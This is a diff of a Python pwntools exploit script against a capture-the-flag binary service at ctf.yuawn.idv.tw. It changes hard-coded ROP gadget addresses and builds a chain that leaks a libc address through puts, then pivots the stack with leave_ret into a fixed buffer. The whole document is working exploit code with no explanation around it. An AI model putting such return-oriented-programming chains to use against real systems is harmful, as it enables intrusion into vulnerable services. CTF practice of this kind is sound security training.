@@ -12,19 +12,18 @@ host , port = 'ctf.yuawn.idv.tw' , 10109
 y = remote( host , port )
 
 name = 0x601080
-main = 0x400676
-puts_plt = 0x400520
-pop_rdi = 0x4007a3
-pop_rbp = 0x4005e0
-leave_ret = 0x40072f
+main = 0x400636
+pop_rdi = 0x400743
+pop_rbp = 0x4005a0
+leave_ret = 0x4006d1
 
 p = flat(
     pop_rdi,
     e.got['__libc_start_main'],
     e.plt['puts'],
     pop_rbp,
-    name + 0x70,
-    0x4006f1
+    name + 0x200,
+    0x400693
 )
 
 print hex(e.plt['puts']) , hex(e.got['__libc_start_main']) , len(p)
@@ -33,7 +32,7 @@ y.sendafter( '?' , p )
 
 p = flat(
     'D' * 0x20,
-    name,
+    name - 8,
     leave_ret
 )
 
